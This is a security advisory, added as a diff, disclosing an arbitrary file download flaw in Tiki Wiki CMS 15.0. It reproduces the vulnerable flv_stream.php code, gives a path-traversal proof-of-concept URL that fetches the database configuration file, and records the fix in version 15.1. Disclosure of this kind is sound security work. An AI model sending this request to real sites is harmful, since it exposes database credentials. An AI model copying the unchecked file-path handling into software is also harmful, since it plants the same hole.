@@ -1,0 +1,57 @@
+# Exploit Title: Tiki Wiki CMS 15.0 Arbitrary File Download
+# Date: 11-07-2016
+# Software Link: https://tiki.org
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: webapps
+ 
+1. Description
+
+Using `flv_stream.php` file from `vendor` directory we can download any file.
+
+http://security.szurek.pl/tiki-wiki-cms-150-arbitrary-file-download.html
+
+File: tiki-15.0\vendor\player\flv\flv_stream.php
+
+<?php
+session_cache_limiter('nocache');
+header('Expires: Thu, 19 Nov 1981 08:52:00 GMT');
+header('Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0');
+header('Pragma: no-cache');
+
+$position = $_GET['position'];
+$filename = dirname(__FILE__).'/'.htmlspecialchars($_GET['file']);
+
+
+if (file_exists($filename)) {
+	header('Content-Type: video/x-flv');
+	if ($position != 0) {
+		echo 'FLV', pack('CCNN', 1, 1, 9, 9);
+	}
+	$file = fopen($filename, "rb");
+	fseek($file, $position);
+	while (!feof($file)) {
+		echo fread($file, 16384);
+	}
+	fclose($file);
+} else {
+	echo 'The file does not exist';
+}
+?>
+
+2. Proof of Concept
+
+Example for downloading database configuration:
+
+http://tiki/vendor/player/flv/flv_stream.php?file=../../../db/local.php&position=0
+
+3. Solution:
+   
+Update to version 15.1
+
+Timeline:
+
+    01-06-2016: Discovered
+    01-06-2016: Vendor notified
+    08-06-2016: Version 15.1 released, issue resolved
